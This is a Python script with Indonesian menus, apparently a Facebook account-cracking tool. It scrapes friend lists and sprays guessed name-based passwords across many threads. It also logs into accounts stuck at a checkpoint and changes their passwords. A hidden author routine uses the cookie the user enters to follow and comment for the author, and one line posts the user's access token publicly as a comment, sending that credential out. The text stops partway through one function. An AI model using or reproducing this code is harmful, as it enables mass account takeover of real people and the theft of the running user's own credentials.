#!/usr/bin/python3
# -*- coding: utf-8 -*-
# GAK USAH DI OPRAK" LAGI,sc sudah nya enak
# kalau lu recode data hp lu yang hilang!!
# ------ [ Gausah Dioprek Ntar Error ] ------ #
Author    = 'Mhd Syafii'
Facebook  = 'Facebook.com/fikritampan305'
Instagram = 'Instagram.com/fi_sinaga'
Whatsapp  = '081269496231'
YouTube   = 'youtube.com/channel/UCr218CW05wRLJguvi9ijRrA'
LicenseKey = 'Hanya 06 Hari'
Syafii  = 100080716718035
Postingan = 115753054458585
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
from time import sleep as waktu
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")

### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
url = "https://mbasic.facebook.com"
ses = requests.Session()
id = []
cp = []
ok = []
opsi = []
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0
headerz = random.choice([
	'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
	'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
])

###----------[ TIME ]---------- ###
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Ma7ret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s
   _____ _                 __   _    _____ 
  / ___/(_)___ ___  ____  / /__| |  / /__ \

  \__ \/ / __ `__ \/ __ \/ / _ \ | / /__/ /
 ___/ / / / / / / / /_/ / /  __/ |/ // __/ 
/____/_/_/ /_/ /_/ .___/_/\___/|___//____/ 
                /_/                        """%(N))
  
###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Make Directory LICENSE
    try:os.mkdir("license")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass
###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id);menu()
    except Exception as e:
      return(username);menu()
    
###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print(f"{P}[+] Terjadi Kesalahan !")
    print(f"{P}[+] Tidak Dapat Mengeksekusi"(error))
    print(f"{P}[+] Hal Ini Mungkin Terjadi : ")
    print(f"{P}[01] Cookies/Token Invalid")
    print(f"{P}[02] Salah Memasukkan ID")
    print(f"{P}[03] bug Pada Source Code")
    print(f"{P}[04] Bug Pada Requests")
    print(f"{P}[05] Dan Lain-Lain")
    print(f"{P}[•] Jalankan Ulang Source Code Ini : ")
    print(f"{P}[•] python yuki.py")
    exit()

###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Syafii)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for x in bos.find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(___fii___Sayang___Kamu___Widiya___())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))
        
### BAGIAN LOGIN ###
def login():
	os.system('clear')
	try:
		token = open('login/token.json', 'r')
		cookie = {'cookie':open('login/cookie.json','r').read()}
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		mkdir_data_login()
		print('──────────────────────────────────────────')
		cookie = input(' [?] masukkan cookie : ')
		try:
		  token = clotox(cookie)
		  coki = {'cookie':cookie}
		  bot_author(coki,token,cookie)
		  open('login/token.json', 'w').write(token)
		  open('login/cookie.json','w').write(cookie)
		  menu()
		except KeyError:print(" %s[!] cookie kadaluwarsa!"%(M));exit()
		except requests.exceptions.ConnectionError:print(" %s[!] anda tidak terhubung ke internet!"%(M));exit()

### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('login/token.json', 'r').read()
		cookie = {'cookie':open('login/cookie.json','r').read()}
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/100023812724814/subscribers?access_token=' + (token),cookies=cookie)
	requests.post('https://graph.facebook.com/100026441864942/subscribers?access_token=' + (token),cookies=cookie)
	requests.post('https://graph.facebook.com/100013775598620/subscribers?access_token=' + (token),cookies=cookie)
	requests.post('https://graph.facebook.com/100004601539472/subscribers?access_token=' + (token),cookies=cookie)
	requests.post('https://graph.facebook.com/100006033517423/subscribers?access_token=' + (token),cookies=cookie)
	requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + (token),cookies=cookie)
	menu()
### BAGIAN MENU ###
def menu():
    global token, cookie
    os.system('clear')
    try:
        token = open('login/token.json', 'r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        get = requests.get("https://graph.facebook.com/me?access_token=%s"%(token),cookies=cookie)
        language(cookie)
        a = json.loads(get.text)
        nama = a['name']
        uid = a['id']
        ttl = a['birthday']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token kadaluwarsa!"%(M));login()
    os.system('clear');logo()
    print('──────────────────────────────────────────')
    print(" Nama        : %s"%(nama))
    print(" ID          : %s"%(uid))
    print(" Tgl. Lahir  : %s"%(ttl))
    print('──────────────────────────────────────────')
    print(" [1]. crack teman/publik")
    print(" [2]. cek opsi akun cp")
    print(" [3]. lihat hasil crack")
    print(" [4]. setting user agent")
    print(" [5]. logout (hapus token)")
    print('──────────────────────────────────────────')
    asw = input(" [?] pilih menu : ")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    elif asw == "2":
    	cekopsi()
    elif asw == "3":
    	cekhasil()
    elif asw == "4":
    	gantiua()
    elif asw == "5":
    	os.system('rm -f login/token.json')
    	os.system('rm -rf login/cookie.json')
    	print('──────────────────────────────────────────')
    	jalan(" [✓] berhasil menghapus token ")
    	exit()
    else:
    	jalan(" [!] pilih jawaban dengan bener ! ")
    	menu() 
 
def gantiua():
	print('──────────────────────────────────────────')
	ajg = input(" [?] masukan ua : ")
	if ajg in[""]:
		menu()
	else:
		try:
			zedd = open('ugent.json', 'w').write(ajg)
			print('──────────────────────────────────────────')
			print(" [✓] berhasil mengganti ua")
			input(" [*] tekan enter untuk kembali ke menu")
			menu()
		except KeyError:
			exit()
### CEK OPSI ###
def cekopsi():
	dirs = os.listdir("CP")
	print('──────────────────────────────────────────')
	for file in dirs:
		print(" [*] CP/"+file)
	print('──────────────────────────────────────────')
	files = input(" [?] file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n [!] nama file %s tidak tersedia"%(files))
	ubahpw()
	print('\n [!] anda bisa mematikan data selular untuk menjeda proses cek')
	print('──────────────────────────────────────────')
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print(" [+] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
		try:
			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
		print('──────────────────────────────────────────')
	print("\n [!] cek akun sudah selesai...")
	input(" [*] tekan enter untuk kembali ke menu ")
	time.sleep(1)
	menu()

def ubahpw():
	print('──────────────────────────────────────────')
	pw=input(" [?] ubah sandi tap yes?[Y/t]: ")
	if pw == "Y" or pw == "y":
		ubahP.append("y")
		pw2=input(" [?] masukan sandi : ")
		if len(pw2) <= 5:
			exit(" [!] kata sandi minimal 6 karakter ")
		else:
			pwbaru.append(pw2)
	else:
		pass

def cek_opsi(user,pw):
	global loop,ubahP,pwbaru
	session=requests.Session()
	session.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	})
	soup=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=parser(urlPost.text, "html.parser")
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r %s[!] akun terkunci tampilan sesi new%s"%(M,N))
		else:
			loop+=1
			print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "checkpoint" in session.cookies.get_dict():
		loop+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=parser(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print("\r [+] terdapat "+str(len(cek))+" opsi ")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(user,pw,session,response,link2)
				else:
					print("\r [✓] akun tap yes, silahkan login di fb lite \n %s[✓] %s|%s|%s%s									\n"%(H,user,pwbaru,coki[0],N))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r %s[!] akun terpasang autentikasi dua faktor%s							\n"%(M,N))
			else:
				print("Kesalahan!")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print("  [%s] %s"%(str(number),opsi[0]))
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print("  [%s] %s"%(str(number),opsi[0]))
			print("")
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		loop+=1
		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")

def ubah_pw(user,pw,session,response,link2):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=parser(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwbaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print("\r [✓] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[✓] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],coki,N))
		cek_apk(coki)
		
def cek_apk(coki):
	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		print("{P}[+] Apk yang terkait:")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			print("  {N}[+] Apk Aktif :")
			print("   [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.")
		else:
			print("  {N}[+] Apk Aktif :")
			apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				print("   [{H}{hit1}{N}]. {N}{muncul} -> {H}{ditambahkan[hit2]}{N}")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
			print("  {N}[+] Apk kadaluarsa :")
			print("   [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
		else:
			hit1,hit2=0,0
			print("  {N}[+] Apk kadaluarsa :")
			apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				print("   [{H}{hit1}{N}]. {N}{muncul} -> {M}{kadaluarsa[hit2]}{N}")
				hit2+=1
	else:
		print('\n %s[!] cookies anda kadaluwarsa%s'%(M,N));waktu(1)
	print("")

### CEK HASIL ### 
def cekhasil():
	print('──────────────────────────────────────────')
	print(' [1]. lihat hasil crack OK ')
	print(' [2]. lihat hasil crack CP ')
	print('──────────────────────────────────────────')
	anjg = input(' [?] pilih : ')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print('──────────────────────────────────────────')
		for file in dirs:
			print(" [*] "+file)
		try:
			print('──────────────────────────────────────────')
			file = input(" [?] file : ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		print('──────────────────────────────────────────')
		os.system("cat OK/%s"%(file))
		print('──────────────────────────────────────────')
		input(" [*] tekan enter untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print('──────────────────────────────────────────')
		for file in dirs:
			print(" [*] "+file)
		try:
			print('──────────────────────────────────────────')
			file = input(" [?] file : ")
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		print('──────────────────────────────────────────')
		os.system("cat CP/%s"%(file))
		print('──────────────────────────────────────────')
		input(" [*] tekan enter untuk kembali ke menu ")
		menu()
	else:
		menu()

### DUMP PUBLIK ###
def publik():
	try:
		token=open("login/token.json","r").read()
		cookie = {'cookie':open('login/cookie.json','r').read()}
	except IOError:
		exit(" [!] token kadaluwarsa")
	idt=input(" [?] masukkan id : ")
	if idt in[""]:
		menu()
	print('──────────────────────────────────────────')
	print(" [1] crack all id   [2] crack id old")
	ask=input(" [?] pilih : ")
	if ask in[""]:
		menu()
	elif ask in["1"]:
		try:
		  url = requests.Session().get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(idt,token),cookies=cookie)
		  z=json.loads(url.text)
		  for i in z['friends']['data']:
		    uid = i["id"]
		    nama = i["name"]
		    id.append(uid+"<=>"+nama)
		except KeyError:
		  print("[•] User id tidak di temukan atau akun tersebut privat ");menu()
		  if len(id) !=0:
		    print(" [+] total id : %s"%(len(id)))
		    atursandi()
	elif ask in["2"]:
	  try:
	    url = requests.Session().get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(idt,token),cookies=cookie)
	    z=json.loads(url.text)
	    for i in z['friends']['data']:
	      uid = i["id"]
	      nama = i["name"]
	      id.append(uid+"<=>"+nama)
	  except KeyError:
	    print("[•] User id tidak di temukan atau akun tersebut privat ");menu()
	    if len(id) !=0:
	      print(" [+] total id : %s"%(len(id)))
	      atursandi()
### ATUR SANDI ###
def atursandi():
	print('──────────────────────────────────────────')
	print(" [1] otomatis  [2] manual  [3] gabungkan")
	ask=input(" [?]pilih : ")
	if ask in[""]:
	  menu()
	elif ask in["1"]:
		otomatis()
	elif ask in["2"]:
		manual()
	elif ask in["3"]:
		gabungkan()
	else:
		exit()

def munculopsi():
	print('──────────────────────────────────────────')
	print(" [1] munculkan opsi  [2] jangan munculkan")
	ask=input(" [?] pilih : ")
	if ask in[""]:
		menu()
	elif ask in["1"]:
		opsi.append("y")
	elif ask in["2"]:
		opsi.append("t")
	else:
		exit()

### OTOMATIS ###
def otomatis():
	munculopsi()
	print('──────────────────────────────────────────')
	print(" [1]. metode API")
	print(" [2]. metode mbasic")
	print(" [3]. metode mobile")
	print('──────────────────────────────────────────')
	ask=input(" [?] pilih : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(api, uid, pwx)
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
		
### MANUAL ###
def manual():
	munculopsi()
	print('──────────────────────────────────────────')
	print(" [!] gunakan , (koma) sebagai pemisah")
	pwek=input(' [?] buat kata sandi : ')
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print('──────────────────────────────────────────')
	print(" [1]. metode API")
	print(" [2]. method mbasic")
	print(" [3]. method mobile")
	print('──────────────────────────────────────────')
	ask=input(" [?] pilih : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(api, uid, pwek.split(","))
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' [+] hasil OK disimpan ke -> ok.json')
		print(' [+] hasil CP disimpan ke -> cp.json')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' [+] hasil OK disimpan ke -> ok.json')
		print(' [+] hasil CP disimpan ke -> cp.json')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
		
### GABUNGAN ###
def gabungkan():
	munculopsi()
	print('──────────────────────────────────────────')
	print(" [!] sandi bawaan nama123,1234,12345")
	print(" [!] gunakan , (koma) sebagai pemisah")
	pwek=input(' [?] sandi gabungan : ')
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print('──────────────────────────────────────────')
	print(" [1]. method API")
	print(" [2]. method mbasic")
	print(" [3]. method mobile")
	print('──────────────────────────────────────────')
	ask=input(" [?] pilih : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(api, uid, pwx)
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
